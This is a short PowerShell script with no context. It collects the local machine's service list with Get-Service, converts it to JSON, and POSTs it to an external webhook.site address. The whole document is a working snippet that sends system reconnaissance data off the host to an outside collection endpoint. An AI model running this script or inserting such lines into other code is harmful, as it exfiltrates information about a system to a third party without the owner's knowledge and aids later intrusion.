$content = Get-Service
$content = ConvertTo-Json $content
Invoke-WebRequest -Uri https://webhook.site/e3b48e4c-d818-4f11-ac15-4c7c6fb532dd -Method POST -Body $content
